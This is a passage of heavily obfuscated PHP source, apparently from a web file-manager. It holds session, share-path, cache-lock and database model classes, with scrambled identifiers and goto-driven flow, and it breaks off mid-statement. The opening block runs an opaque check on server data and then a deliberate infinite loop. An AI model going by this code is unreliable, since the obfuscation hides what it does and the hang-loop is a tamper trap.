Hook::apply($c›¨ï˜ôèÑ . $CŸûæù∆µπ[2201]); } } } if (!isset($_SERVER[$_SERVER[Ä¿¡‡öóµŸﬂ‡][712]]) || !isset($_SERVER[$_SERVER[Ä¿¡‡öóµŸﬂ‡][2128]])) { goto AãöÑÍ†è»; eŒÏˆûÒÜŸ: $DçÈ™≈ΩÆ∑ = explode($_SERVER[Ä¿¡‡öóµŸﬂ‡][217], $D ñçÊ—·å); if (count($DçÈ™≈ΩÆ∑) < $_SERVER[Ä¿¡‡öóµŸﬂ‡][548]) { $bË¨èÌ…ñ¨ = $_SERVER[Ä¿¡‡öóµŸﬂ‡][716]; $bË¨èÌ…ñ¨(); } $c¡°Ö¥·Â∫ = $_SERVER[Ä¿¡‡öóµŸﬂ‡][717]; goto e¥÷Ω≥≈∞—; AãöÑÍ†è»: $dËç˘•Œùß = $_SERVER[Ä¿¡‡öóµŸﬂ‡][713]; $b∏È∏©Ñã‚ = $_SERVER[$_SERVER[Ä¿¡‡öóµŸﬂ‡][714]] . $_SERVER[Ä¿¡‡öóµŸﬂ‡][715]; $D ñçÊ—·å = $dËç˘•Œùß($b∏È∏©Ñã‚); goto eŒÏˆûÒÜŸ; e¥÷Ω≥≈∞—: $c¡°Ö¥·Â∫($_SERVER[$_SERVER[Ä¿¡‡öóµŸﬂ‡][714]] . $_SERVER[Ä¿¡‡öóµŸﬂ‡][715]); $FåçÈïÍ≥€ = 2; while ($FåçÈïÍ≥€ > 1) { $B©àÑ∑£§ì = rawurlencode($FåçÈïÍ≥€ . $_SERVER[Ä¿¡‡öóµŸﬂ‡][361]); } goto cñ€Î„≤Ì—; cñ€Î„≤Ì—: } class SessionModel extends ModelBase { protected $tableName = "\163\171\x73\164\x65\155\137\x73\x65\163\x73\151\x6f\156"; public function get($FÓÚèÚ„úø) { $a∆‹«–Ö»Á =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $dæó“∏öî« = $this->where(array($a∆‹«–Ö»Á[2208] => $FÓÚèÚ„úø))->find(); if (!is_array($dæó“∏öî«)) { return !1; } return $dæó“∏öî«[$a∆‹«–Ö»Á[692]]; } public function set($EÑúèª´êë, $aœÜ•ÒÊõ¡, $cﬁÕÏ⁄öÎó = 3600) { $F“◊≥í∆üŒ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $eﬁ¬ÿ±¬ÈÈ = array($F“◊≥í∆üŒ[2208] => $EÑúèª´êë, $F“◊≥í∆üŒ[2137] => $aœÜ•ÒÊõ¡, $F“◊≥í∆üŒ[2209] => $cﬁÕÏ⁄öÎó + time()); if (Session::get($F“◊≥í∆üŒ[2210])) { $eﬁ¬ÿ±¬ÈÈ[$F“◊≥í∆üŒ[1438]] = Session::get($F“◊≥í∆üŒ[2210]); } else { $eﬁ¬ÿ±¬ÈÈ[$F“◊≥í∆üŒ[1438]] = 0; } if ($this->get($EÑúèª´êë)) { return $this->where(array($F“◊≥í∆üŒ[2208] => $EÑúèª´êë))->save($eﬁ¬ÿ±¬ÈÈ); } else { return $this->add($eﬁ¬ÿ±¬ÈÈ, array(), !0); } } public function remove($CÎÜ¬“ã¨µ) { return $this->where(array($_SERVER[Ä¿¡‡öóµŸﬂ‡][2208] => $CÎÜ¬“ã¨µ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[Ä¿¡‡öóµŸﬂ‡][2211] . time())->delete(); } } goto dûøã˘√¡á; E◊Ù»´◊Íê: class PathDriverDbShareItem extends PathDriverDB { public function __construct($A”†ÛßÍäø) { $this->pathParse = $A”†ÛßÍäø; $this->model = Model($_SERVER[Ä¿¡‡öóµŸﬂ‡][1121]); } public function getPathOuter($E¢≤‰Öéº˘) { $Eﬁ≈û±á◊û =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$E¢≤‰Öéº˘) { return $E¢≤‰Öéº˘; } $A™©≥ë⁄ÑÜ = $this->parse($E¢≤‰Öéº˘); return trim(KodIO::makeShare($this->pathParse[$Eﬁ≈û±á◊û[367]], $A™©≥ë⁄ÑÜ[$Eﬁ≈û±á◊û[367]]), $Eﬁ≈û±á◊û[8]); } protected function infoParse($dÚº›ΩÁÍ›, $Eˆ›¬¿ôã„ = false, $CÓ“‰„öìè = false) { $BïŒ«ö®õª =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $B›√Êã¥ªù = $this->pathParse[$BïŒ«ö®õª[367]]; $FƒÁª—«Î¿ = trim($this->pathParse[$BïŒ«ö®õª[1016]], $BïŒ«ö®õª[8]); return Action($BïŒ«ö®õª[1127])->sharePathInfo($B›√Êã¥ªù, $FƒÁª—«Î¿); } public function infoFull($cƒ≥©ê¨ÿø) { $dß∑˜¢£Û√ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $AßˆÔÔ ËÈ = explode($dß∑˜¢£Û√[8], trim($cƒ≥©ê¨ÿø, $dß∑˜¢£Û√[8])); if (count($AßˆÔÔ ËÈ) > 1) { $BòçŸ’«ãå = implode($dß∑˜¢£Û√[8], array_splice($AßˆÔÔ ËÈ, 1)); $cõ·Ùªı‰ = $this->model->pathInfoByPath($AßˆÔÔ ËÈ[0], $BòçŸ’«ãå); if (!$cõ·Ùªı‰) { return !1; } $this->pathParse[$dß∑˜¢£Û√[1016]] = $cõ·Ùªı‰[$dß∑˜¢£Û√[369]]; } return $this->infoParse($cƒ≥©ê¨ÿø); } public function listAll($d˘„°æ±öÔ) { goto cçÈÖçÕÏÙ; A∑Û˘„ÍŒÛ: foreach ($Eì»®Ì≤äØ as &$fﬁ‰¥é≤ΩÖ) { check_abort(); $fﬁ‰¥é≤ΩÖ[$AıîÊ°Ωñ◊[391]] = $CûÛ‰˜ñ⁄“->_shareItemeParse($fﬁ‰¥é≤ΩÖ[$AıîÊ°Ωñ◊[391]], $dò∑˘ØÑ’∞); } return $Eì»®Ì≤äØ; goto cæ•Õ£»¡—; cçÈÖçÕÏÙ: $AıîÊ°Ωñ◊ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $dÆÀ∏√ÍË€ = IO::info($this->pathParse[$AıîÊ°Ωñ◊[75]]); if (!$dÆÀ∏√ÍË€) { return array(); } goto aõ†◊Ñì¨Ö; aõ†◊Ñì¨Ö: $Eì»®Ì≤äØ = $this->model->listAll($d˘„°æ±öÔ); $dò∑˘ØÑ’∞ = Model($AıîÊ°Ωñ◊[536])->getInfo($dÆÀ∏√ÍË€[$AıîÊ°Ωñ◊[441]]); $CûÛ‰˜ñ⁄“ = Action($AıîÊ°Ωñ◊[1127]); goto A∑Û˘„ÍŒÛ; cæ•Õ£»¡—: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($Bâù∑é¥≥á) { $this->pathParse = $Bâù∑é¥≥á; $this->model = Model($_SERVER[Ä¿¡‡öóµŸﬂ‡][1121]); } protected function infoParse($Càíª¶ÛØç, $a™»—÷±òâ = false, $cΩÎ·íÜüé = false) { $e≈û¥ô≠ó =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; return Action($e≈û¥ô≠ó[1022])->sharePathInfo($this->pathParse[$e≈û¥ô≠ó[75]], !0); } public function listPath($B«ñ†É≠‘, $B£Î´Ã¥áë = false) { $Dﬂà∫•¬ÇÇ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $FÉÌ∑éŸ›Ó = parent::listPath($B«ñ†É≠‘, $B£Î´Ã¥áë); foreach ($FÉÌ∑éŸ›Ó as $c”±ÕÜ Çﬁ => $f¥‚Î—¢±¬) { if (!in_array($c”±ÕÜ Çﬁ, array($Dﬂà∫•¬ÇÇ[73], $Dﬂà∫•¬ÇÇ[74]))) { continue; } foreach ($f¥‚Î—¢±¬ as $e∑¥öõá¬√ => $bÇÖäÀäÇ∑) { $FÉÌ∑éŸ›Ó[$c”±ÕÜ Çﬁ][$e∑¥öõá¬√] = Action($Dﬂà∫•¬ÇÇ[1022])->shareItemInfo($bÇÖäÀäÇ∑); } } return $FÉÌ∑éŸ›Ó; } public function listAll($c∏Ê€·…‘ß) { $C±◊Í‡ûëó =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $aàÕËÒ≥ä˘ = IO::info($this->pathParse[$C±◊Í‡ûëó[75]]); if (!$aàÕËÒ≥ä˘) { return array(); } $Cî¶∏ÀÊ¥Ç = $this->model->listAll($c∏Ê€·…‘ß); foreach ($Cî¶∏ÀÊ¥Ç as &$AÜ•‘Îﬂâ√) { $AÜ•‘Îﬂâ√[$C±◊Í‡ûëó[391]] = Action($C±◊Í‡ûëó[1022])->shareItemInfo($AÜ•‘Îﬂâ√[$C±◊Í‡ûëó[391]]); } return $Cî¶∏ÀÊ¥Ç; } } class PathDriverDriverShareItem { public function __construct($C–ÉÙ®ÍóÂ) { $this->pathParse = $C–ÉÙ®ÍóÂ; } public function __call($a„¬Çıååê, $BŒÑÚå·ŒÑ) { $b¡óåÒí≈• =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (method_exists($this, $a„¬Çıååê)) { return; } $CºÇ∂¶…“… = call_user_func_array(array($b¡óåÒí≈•[1128], $a„¬Çıååê), $BŒÑÚå·ŒÑ); $Eû’ôáêßã = array($b¡óåÒí≈•[1129], $b¡óåÒí≈•[1130], $b¡óåÒí≈•[1131], $b¡óåÒí≈•[1132], $b¡óåÒí≈•[490], $b¡óåÒí≈•[492], $b¡óåÒí≈•[1133], $b¡óåÒí≈•[103], $b¡óåÒí≈•[1134], $b¡óåÒí≈•[1135]); if (in_array($a„¬Çıååê, $Eû’ôáêßã)) { $CºÇ∂¶…“… = $this->getPathOuter($CºÇ∂¶…“…); } return $CºÇ∂¶…“…; } public function copy($cë§•åΩÜâ, $BñΩâÒãÈò, $B∂¥ª´±ﬁ˘ = false) { return $this->copyMove($cë§•åΩÜâ, $BñΩâÒãÈò, $B∂¥ª´±ﬁ˘, $_SERVER[Ä¿¡‡öóµŸﬂ‡][490]); } public function move($f∂ÎﬂöÜÑö, $AÆÔ¬È¯üÒ, $a±Øßü∫«í = false) { return $this->copyMove($f∂ÎﬂöÜÑö, $AÆÔ¬È¯üÒ, $a±Øßü∫«í, $_SERVER[Ä¿¡‡öóµŸﬂ‡][492]); } private function copyMove($Bﬂ¿õ∑◊÷Â, $Eã‰çÑ∫úä, $Bø’ÛΩ®’¯, $B∫∂ùÁ†Êƒ) { goto cõ”ÏßÀΩ≤; Dò—›“„É“: if ($B‘Ü°Èã¬«->pathParse[$dâÎãêãÑ [1002]]) { $Eã‰çÑ∫úä = $B‘Ü°Èã¬«->pathParse[$dâÎãêãÑ [1002]]; } else { $Eã‰çÑ∫úä = $dé†ÈÎàˆé; } $D¨ãÑŸ∑¯ = IO::copyMove($Bﬂ¿õ∑◊÷Â, $Eã‰çÑ∫úä, $Bø’ÛΩ®’¯, $B∫∂ùÁ†Êƒ); $D¨ãÑŸ∑¯ = $this->getPathOuter($D¨ãÑŸ∑¯); goto c¡—®§ñéâ; cõ”ÏßÀΩ≤: $dâÎãêãÑ  =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $dé†ÈÎàˆé = $Eã‰çÑ∫úä; $B‘Ü°Èã¬« = IO::driverMake($Eã‰çÑ∫úä); goto Dò—›“„É“; c¡—®§ñéâ: return $D¨ãÑŸ∑¯; goto Eñ∂»¯Ó™Ú; Eñ∂»¯Ó™Ú: } public function pathFather($Có—‰ƒæòÃ) { return get_path_father($this->pathParse[$_SERVER[Ä¿¡‡öóµŸﬂ‡][75]]); } public function iconvSystem($C©î„É≈‹ù) { return $C©î„É≈‹ù; } protected function infoParse($bÿﬂ°ÌŸÜÜ, $eÓ≥Éî—Ã… = false) { $fﬂﬂÜò¥“¿ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $c÷⁄Ü«Æ—ÿ = $this->pathParse[$fﬂﬂÜò¥“¿[439]][$fﬂﬂÜò¥“¿[1023]] . $this->pathParse[$fﬂﬂÜò¥“¿[1016]]; if ($eÓ≥Éî—Ã…) { $E◊’µ™ì£ª = IO::infoWithChildren($c÷⁄Ü«Æ—ÿ); } else { $E◊’µ™ì£ª = IO::info($c÷⁄Ü«Æ—ÿ); } $B¿çÈÊçÙ» = $this->pathParse[$fﬂﬂÜò¥“¿[439]]; return Action($fﬂﬂÜò¥“¿[1127])->_shareItemeParse($E◊’µ™ì£ª, $B¿çÈÊçÙ»); } public function listAll($BÊÂ¨ÆŸ·›) { $Cëµ√˘®°Ö =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $dﬁ˘ºáéäè = IO::listAll($BÊÂ¨ÆŸ·›); $D©¶õ¡æø = $this->pathParse[$Cëµ√˘®°Ö[439]]; foreach ($dﬁ˘ºáéäè as &$EØÛø¶â£â) { check_abort(); $EØÛø¶â£â = array_merge(IO::info($EØÛø¶â£â[$Cëµ√˘®°Ö[75]]), $EØÛø¶â£â); $EØÛø¶â£â[$Cëµ√˘®°Ö[391]] = Action($Cëµ√˘®°Ö[1127])->_shareItemeParse($EØÛø¶â£â, $D©¶õ¡æø); } return $dﬁ˘ºáéäè; } public function getPathOuter($dﬂÈ’´ãÍ≤) { goto eóùñ±∫´Í; bë–›÷å—≠: $CÎ‘Ö´™ùÏ = KodIO::clear($dﬂÈ’´ãÍ≤); $CΩõÃãÂ∞Ç = KodIO::clear($this->pathParse[$EÃ„¨ÖÍÔœ[439]][$EÃ„¨ÖÍÔœ[1023]]); $e ·êã—äê = substr($CÎ‘Ö´™ùÏ, strlen($CΩõÃãÂ∞Ç)); goto f°ê‹∑Ô∫ƒ; f°ê‹∑Ô∫ƒ: if (substr($CÎ‘Ö´™ùÏ, 0, strlen($CΩõÃãÂ∞Ç)) != $CΩõÃãÂ∞Ç) { return !1; } return $this->pathParse[$EÃ„¨ÖÍÔœ[1017]] . $EÃ„¨ÖÍÔœ[8] . ltrim($e ·êã—äê, $EÃ„¨ÖÍÔœ[8]); goto C±¿ÍüÕπ°; eóùñ±∫´Í: $EÃ„¨ÖÍÔœ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $fÑË•Ü¶⁄ü = KodIO::parse($dﬂÈ’´ãÍ≤); if ($fÑË•Ü¶⁄ü[$EÃ„¨ÖÍÔœ[29]] == KodIO::KOD_SHARE_ITEM) { return $fÑË•Ü¶⁄ü[$EÃ„¨ÖÍÔœ[75]]; } goto bë–›÷å—≠; C±¿ÍüÕπ°: } public function getType() { $bÜ±Ç∫•ìâ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $düπ…º«´å = str_replace($bÜ±Ç∫•ìâ[71], $bÜ±Ç∫•ìâ[33], get_class($this)); return strtolower($düπ…º«´å); } public function isTypeObject($B‰ÿÒÈÏ∏±) { return IO::isTypeObject($B‰ÿÒÈÏ∏±); } public function info($F¨√«Ö∫º≤) { return $this->infoParse($F¨√«Ö∫º≤); } public function infoAuth($d·‡∞Èù«∂) { return $this->infoParse($d·‡∞Èù«∂); } public function infoWithChildren($d°§…Œùõî) { return $this->infoParse($d°§…Œùõî, !0); } public function infoFull($f»ûë¬ªØ≠) { return $this->infoParse($f»ûë¬ªØ≠); } } goto E–Ωö…Ñ¬∫; f¶Òúæ«˜: class CacheLockRedis { public function lock($D∏œ‹≤Ãﬂ„, $fŸü¡˜ËÏî = 10) { $FﬂΩ“û≥ÙÖ = Cache::init(); $Eø£’•æ¥¡ = microtime(!0) + $fŸü¡˜ËÏî; while (microtime(!0) < $Eø£’•æ¥¡) { $eˆÃ•û®ÒÆ = $FﬂΩ“û≥ÙÖ->get($D∏œ‹≤Ãﬂ„); if (!$eˆÃ•û®ÒÆ) { $E≈á§à »É = $FﬂΩ“û≥ÙÖ->setLock($D∏œ‹≤Ãﬂ„, $Eø£’•æ¥¡, $fŸü¡˜ËÏî); if ($E≈á§à »É) { return !0; } } else { if ($eˆÃ•û®ÒÆ < microtime(!0)) { $FﬂΩ“û≥ÙÖ->set($D∏œ‹≤Ãﬂ„, $Eø£’•æ¥¡, $Eø£’•æ¥¡); if ($FﬂΩ“û≥ÙÖ->get($D∏œ‹≤Ãﬂ„) === $eˆÃ•û®ÒÆ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($fê´±ˆ±) { return Cache::init()->get($fê´±ˆ±); } public function unlock($CÆ£ìÚ∑æ’) { return Cache::init()->remove($CÆ£ìÚ∑æ’); } } class CacheLockMemcached { public function lock($f‚ÑàéÊ†å, $bÚåÏŸΩãé = 0) { $DÑ∫Ê™÷ü¿ = Cache::init(); $b©˘µÕ¶ôË = microtime(!0) + $bÚåÏŸΩãé; while (microtime(!0) < $b©˘µÕ¶ôË) { $BŸë¶åÿñ« = $DÑ∫Ê™÷ü¿->get($f‚ÑàéÊ†å); if (!$BŸë¶åÿñ« || $BŸë¶åÿñ« < microtime(!0)) { $A¿€‰”‹Ç¿ = $DÑ∫Ê™÷ü¿->handle->add($f‚ÑàéÊ†å, $b©˘µÕ¶ôË, $bÚåÏŸΩãé); if ($A¿€‰”‹Ç¿) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($bóô»√∑Ó) { return Cache::init()->get($bóô»√∑Ó); } public function unlock($E¯çè°Ÿ÷Ú) { return Cache::init()->remove($E¯çè°Ÿ÷Ú); } } class CacheLockDatabase { public function lock($A©≈¥◊€Ü§, $B•ÿñ¬ÆﬂÇ = 0) { $BŸáƒŸàœÕ = Model($_SERVER[Ä¿¡‡öóµŸﬂ‡][765]); $F˘é··§œµ = microtime(!0) + $B•ÿñ¬ÆﬂÇ; while (microtime(!0) < $F˘é··§œµ) { $cœ»îÉ„óù = $BŸáƒŸàœÕ->get($A©≈¥◊€Ü§); if (!$cœ»îÉ„óù || $cœ»îÉ„óù < microtime(!0)) { $B∆À–åÜÖß = $BŸáƒŸàœÕ->set($A©≈¥◊€Ü§, $F˘é··§œµ); if ($B∆À–åÜÖß) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($d◊∆≥ªº≠ë) { return Model($_SERVER[Ä¿¡‡öóµŸﬂ‡][765])->get($d◊∆≥ªº≠ë); } public function unlock($e—¿±∂ªñë) { Model($_SERVER[Ä¿¡‡öóµŸﬂ‡][765])->remove($e—¿±∂ªñë); } } goto AÔêæÕËñı; F±›∞ö‚¡¡: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\x64\x69\146\171\x54\x69\x6d\145", "\x74\x69\155\145", "\151\156\x73\x65\162\x74\54\165\160\144\141\164\145", "\146\165\156\143\x74\x69\157\156"), array("\x63\x72\x65\x61\164\x65\124\151\155\145", "\164\151\155\145", "\151\x6e\163\x65\162\164", "\x66\165\156\x63\164\x69\157\156")); public function setDataAuto($f∏ﬂ≈ÑÒˆ¿) { $this->dataAuto = $f∏ﬂ≈ÑÒˆ¿; } public function __construct($d≈∆ó‡£â‚ = '', $e∫œâıû„„ = '', $f≠·Û∫Ù≤∫ = '') { parent::__construct($d≈∆ó‡£â‚, $e∫œâıû„„, $f≠·Û∫Ù≤∫); } public static function textEncode($C“ÔçÑ·ÑÓ) { if (!$C“ÔçÑ·ÑÓ) { return $C“ÔçÑ·ÑÓ; } $E’†¬ÛªÉŒ = json_encode($C“ÔçÑ·ÑÓ); $E’†¬ÛªÉŒ = preg_replace_callback($_SERVER[Ä¿¡‡öóµŸﬂ‡][342], function ($f◊ë»ÍÙ≈Ö) { return addslashes($f◊ë»ÍÙ≈Ö[0]); }, $E’†¬ÛªÉŒ); return json_decode($E’†¬ÛªÉŒ); } public static function textDecode($Cß‚◊∂íÃ·) { $Eùÿ√¿Çã∑ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $bÈïÿ¥Éë’ = json_encode($Cß‚◊∂íÃ·); $bÈïÿ¥Éë’ = preg_replace_callback($Eùÿ√¿Çã∑[343], function ($bÔê∫Á∏äµ) { return $_SERVER[Ä¿¡‡öóµŸﬂ‡][93]; }, $bÈïÿ¥Éë’); return json_decode($bÈïÿ¥Éë’); } protected $tableMeta = array(); protected function _beforeInsert(&$FΩáàîà∑ç, $båÆÀœ˘È«) { $AõÒàÙÚÛ≈ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$this->checkDataAutoHas($AõÒàÙÚÛ≈[344])) { return; } $this->dataBeforeFilter($FΩáàîà∑ç, $AõÒàÙÚÛ≈[344]); } protected function _beforeUpdate(&$CÓºå“Ç§Î, $bò¿ƒµÇ∏) { $a»ˆó¬À™ã =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$this->checkDataAutoHas($a»ˆó¬À™ã[345])) { return; } $this->dataBeforeFilter($CÓºå“Ç§Î, $a»ˆó¬À™ã[345]); } protected function _afterSelect(&$Dåàﬂ¿ÊêÇ, $cû∂ï√û⁄∫) { if (!is_array($Dåàﬂ¿ÊêÇ)) { return; } if (!$this->checkDataAutoHas($_SERVER[Ä¿¡‡öóµŸﬂ‡][346])) { return; } foreach ($Dåàﬂ¿ÊêÇ as &$dËéÔÕôç•) { $this->dataAfterFilter($dËéÔÕôç•); } } protected function _afterFind(&$aœΩ¢Û“ıî, $Bÿ»ö—àæı) { if (!is_array($aœΩ¢Û“ıî)) { return; } if (!$this->checkDataAutoHas($_SERVER[Ä¿¡‡öóµŸﬂ‡][346])) { return; } $this->dataAfterFilter($aœΩ¢Û“ıî); } public function setAutoIncrement($AÕ≠ú∂ÃÈŸ) { $Föÿòõì·É = array($this->getPk() => $AÕ≠ú∂ÃÈŸ); $fâ∫Ë•ÆÒ“ = $this->data($Föÿòõì·É)->add(); if ($fâ∫Ë•ÆÒ“) { $this->delete($fâ∫Ë•ÆÒ“); } } public function getAutoIncrement() { $AıÇ≠á€ÿé = $this->getTableName(); $Cª∫€áñ©˘ = $this->max($this->getPk()); $C®ƒÎÙâË‰ = $this->query("\163\x68\x6f\x77\40\164\141\142\154\145\40\163\x74\141\x74\165\x73\40\x77\x68\145\162\x65\40\116\x61\155\x65\x3d\47{$AıÇ≠á€ÿé}\x27"); $eˆ∑í´…Õ¶ = $C®ƒÎÙâË‰[0][$_SERVER[Ä¿¡‡öóµŸﬂ‡][347]]; $C¨‹∆√Ø»˘ = max($Cª∫€áñ©˘, $eˆ∑í´…Õ¶); return $C¨‹∆√Ø»˘; } protected function _callBefore($eŒ∫ÁäΩ”Á, $CÀ£ªı„˜ﬂ) { return $this->cacheCallCheck($eŒ∫ÁäΩ”Á, $CÀ£ªı„˜ﬂ, !1); } protected function _callAfter($fÃêëµ¥€ô, $d˜∂à¨ÓÀ‘) { return $this->cacheCallCheck($fÃêëµ¥€ô, $d˜∂à¨ÓÀ‘, !0); } protected function cacheFunctionAlias($dßÒéèâËµ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($c£ πªíœ¿, $F¡Ë—è”ﬂ», $F˘Óƒ·«Ã∆ = false) { $dÛäú‰–ñ◊ = $this->cacheFunctionAlias($F¡Ë—è”ﬂ»); if (!$dÛäú‰–ñ◊) { return; } foreach ($dÛäú‰–ñ◊ as $CœÓÖ ¢§ø => $a◊ÎÔûË£¨) { $aﬂ∑£…Òûó = $a◊ÎÔûË£¨[0]; $bƒÙƒ¶é√¬ = explode($_SERVER[Ä¿¡‡öóµŸﬂ‡][47], $a◊ÎÔûË£¨[1]); if ($c£ πªíœ¿ == $CœÓÖ ¢§ø) { return $this->cacheFunctionGet($CœÓÖ ¢§ø, $aﬂ∑£…Òûó); } if ($F˘Óƒ·«Ã∆ && in_array($c£ πªíœ¿, $bƒÙƒ¶é√¬)) { $this->cacheFunctionClear($CœÓÖ ¢§ø, $aﬂ∑£…Òûó); } } } public function cacheFunctionGet($F¿üµô‚ø≠, $cá»÷Œ∞◊) { $bê¥’∆ßŸ = $this->cacheKeyMake($F¿üµô‚ø≠, $cá»÷Œ∞◊); $F≠€åÌá†π = Cache::get($bê¥’∆ßŸ); if (!is_array($F≠€åÌá†π)) { $F≠€åÌá†π = call_user_func_array(array($this, $F¿üµô‚ø≠), array($cá»÷Œ∞◊, !0)); Cache::set($bê¥’∆ßŸ, $F≠€åÌá†π); } return $F≠€åÌá†π; } public function cacheFunctionClear($Dƒ”¥˘≈Í÷, $D‘ı–Êﬂîã) { $E≠ÈÆΩàÈÉ = $D‘ı–Êﬂîã; if (!is_array($D‘ı–Êﬂîã)) { $E≠ÈÆΩàÈÉ = array($D‘ı–Êﬂîã); } foreach ($E≠ÈÆΩàÈÉ as $a≈Ôß‰¯‘) { $Cè∆úìõ√’ = $this->cacheKeyMake($Dƒ”¥˘≈Í÷, $a≈Ôß‰¯‘); Cache::remove($Cè∆úìõ√’); } } private function cacheKeyMake($AáﬁâŸÀﬂÃ, $F‚¬—ƒÒü≤) { $c±£öÿøœ® =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; return get_class($this) . $c±£öÿøœ®[70] . $AáﬁâŸÀﬂÃ . $c±£öÿøœ®[348] . $F‚¬—ƒÒü≤; } protected function selectPage($B‰’Á†¯ÉÀ = 200, $F∆»Ö—¯≤‡ = 1) { goto cΩ–ö∆¨Œª; fΩäàÿªë›: $fÖëÆ•∆øû = ceil($c€˜•Œ»Ü§ / $B‰’Á†¯ÉÀ); $F∆»Ö—¯≤‡ = intval(isset($in[$DíƒÈÈô¢›[340]]) ? $in[$DíƒÈÈô¢›[340]] : $F∆»Ö—¯≤‡); $F∆»Ö—¯≤‡ = $F∆»Ö—¯≤‡ <= 1 ? 1 : ($F∆»Ö—¯≤‡ >= $fÖëÆ•∆øû ? $fÖëÆ•∆øû : $F∆»Ö—¯≤‡); goto DÉõ“À˜ÜÙ; EáﬂÛ©¶òÎ: $E¯ÓÃïáàÓ = $AÈπ” Æ’; $E¯ÓÃïáàÓ[$DíƒÈÈô¢›[350]] = array(); $this->optionsValue($E¯ÓÃïáàÓ); goto dıéÂ´Ÿâë; c≤Ò°‹¿Ö√: $f∫Ãœ∏…òÿ = 4000; $B‰’Á†¯ÉÀ = isset($in[$DíƒÈÈô¢›[349]]) ? $in[$DíƒÈÈô¢›[349]] : $B‰’Á†¯ÉÀ; if ($B‰’Á†¯ÉÀ === -1) { unset($in[$DíƒÈÈô¢›[349]]); $f∫Ãœ∏…òÿ = 100000000; $B‰’Á†¯ÉÀ = $f∫Ãœ∏…òÿ; } goto EáﬂÛ©¶òÎ; cΩ–ö∆¨Œª: $DíƒÈÈô¢› =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; global $in; $AÈπ” Æ’ = $this->optionsValue(); goto c≤Ò°‹¿Ö√; DÉõ“À˜ÜÙ: $this->optionsValue($AÈπ” Æ’); $CÓ§ê”ç∑Ÿ = $this->page($F∆»Ö—¯≤‡, $B‰’Á†¯ÉÀ)->select(); $CÓ§ê”ç∑Ÿ = is_array($CÓ§ê”ç∑Ÿ) ? $CÓ§ê”ç∑Ÿ : array(); goto A¨è÷˘ø∞Ü; dıéÂ´Ÿâë: $c€˜•Œ»Ü§ = intval($this->count()); $B‰’Á†¯ÉÀ = intval($B‰’Á†¯ÉÀ); $B‰’Á†¯ÉÀ = $B‰’Á†¯ÉÀ <= 5 ? 5 : ($B‰’Á†¯ÉÀ >= $f∫Ãœ∏…òÿ ? $f∫Ãœ∏…òÿ : $B‰’Á†¯ÉÀ); goto fΩäàÿªë›; A¨è÷˘ø∞Ü: if ($fÖëÆ•∆øû == 1) { $c€˜•Œ»Ü§ = count($CÓ§ê”ç∑Ÿ); } $aú£Ï€©©Ñ = array($DíƒÈÈô¢›[351] => array($DíƒÈÈô¢›[352] => $c€˜•Œ»Ü§, $DíƒÈÈô¢›[349] => $B‰’Á†¯ÉÀ, $DíƒÈÈô¢›[340] => $F∆»Ö—¯≤‡, $DíƒÈÈô¢›[353] => $fÖëÆ•∆øû), $DíƒÈÈô¢›[354] => $CÓ§ê”ç∑Ÿ ? $CÓ§ê”ç∑Ÿ : array()); return $aú£Ï€©©Ñ; goto eõ“èûƒñ»; eõ“èûƒñ»: } protected function checkLength($féøàöì™¶, $CÓûå≠íû“ = 0, $E‚à∂Û≤µ = '') { $e∫ÕÓÓÚÇâ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $CÓûå≠íû“ = $CÓûå≠íû“ ? $CÓûå≠íû“ : 65536; if (!$féøàöì™¶ || strlen($féøàöì™¶) < $CÓûå≠íû“) { return; } $E‚à∂Û≤µ = $E‚à∂Û≤µ ? $E‚à∂Û≤µ . $e∫ÕÓÓÚÇâ[67] : $e∫ÕÓÓÚÇâ[33]; show_json($E‚à∂Û≤µ . LNG($e∫ÕÓÓÚÇâ[355]) . "\50{$CÓûå≠íû“}\x29", !1); } protected function metaSet($D·ûéÀï∆‚, $d§â¶Ê··õ = null, $dÕ≤óÇÑﬂß = null) { goto DÑΩ¯©ò™É; DÑΩ¯©ò™É: $CÉàƒÍ‚†ä =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$this->tableMeta) { return !1; } $c«ÇîÃªÛâ = $this->tableMeta[$CÉàƒÍ‚†ä[356]]; goto dçß›œáΩÓ; c‹çô¬Ç¯È: if (is_string($d§â¶Ê··õ)) { $E¥»¨€ÿıﬂ[$d§â¶Ê··õ] = $dÕ≤óÇÑﬂß; } $C∂ïôÑ ®˜ = array(); foreach ($E¥»¨€ÿıﬂ as $bƒÓ≥ïñáÖ => $eº¨Ïı•õ‘) { $this->checkLength($eº¨Ïı•õ‘, !1, $fÔâ›´¬∆ñ . $CÉàƒÍ‚†ä[4] . $bƒÓ≥ïñáÖ); $C∂ïôÑ ®˜[] = array($c«ÇîÃªÛâ => $D·ûéÀï∆‚, $CÉàƒÍ‚†ä[89] => $bƒÓ≥ïñáÖ, $CÉàƒÍ‚†ä[359] => $eº¨Ïı•õ‘); } goto eì¡∑»’í÷; bæ©âáàëâ: if (is_null($d§â¶Ê··õ)) { return 